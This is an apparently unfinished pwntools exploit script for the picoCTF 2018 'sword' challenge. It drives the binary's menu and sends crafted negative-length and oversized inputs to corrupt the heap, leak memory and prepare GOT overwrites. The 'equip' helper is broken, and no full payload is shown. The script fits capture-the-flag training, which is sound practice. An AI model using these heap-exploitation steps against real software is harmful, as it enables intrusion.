#!/usr/bin/env python

from pwn import *

pico = 0

if pico:
	r = remote("2018shell2.picoctf.com", 56800)
else:
	#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico32.libc.so.6")}
	r = process("./sword")#,env=env)
	# gdb.attach(r, '''
	# 	b *0x08048609
	# 	c
	# 	''')

import string
printable = string.ascii_letters + string.digits + string.punctuation + ' '
def hex_escape(s):
    return ''.join(c if c in printable else r'\x{0:02x}'.format(ord(c)) for c in s)

r.recvuntil("/* Welcome! */")

def forge():
	r.sendline("1")
	r.recvuntil("/* Welcome! */")

def synthesize(s1, s2):
	r.sendline("2")
	r.sendline(str(s1))
	r.sendline(str(s2))
	r.recvuntil("/* Welcome! */")

def show(sword):
	r.sendline("3")
	r.sendline(str(sword))
	print hex_escape(r.recvuntil("/* Welcome! */").split("The weight")[1])

def destroy(sword):
	r.sendline("4")
	r.sendline(str(sword))
	r.recvuntil("/* Welcome! */")

def harden(sword, name, len, weight):
	r.sendline("5")
	r.sendline(str(sword))
	r.sendline(str(len))
	r.sendline(name)
	r.sendline(str(weight))
	r.recvuntil("/* Welcome! */")

def equip(sword):
	r.sendline
	r.sendline(str(sword))

# this prints out some garbage bytes
# forge()
# forge()
# forge()
# harden(0,"AAAAAAAAAAAA", -1)
# harden(1,"AAAAAAAAAAAA", -1)
# synthesize(0,1)
# show(1)


MALLOC_GOT = 0x602060
PRINTF_GOT = 0x602030

forge()
forge()
harden(1, 'AAAA', 280, -1)

harden(0, "AAAABBBB" + "EEEEFFFFGGGGHHHH", 32, -1)

show(1)

r.interactive()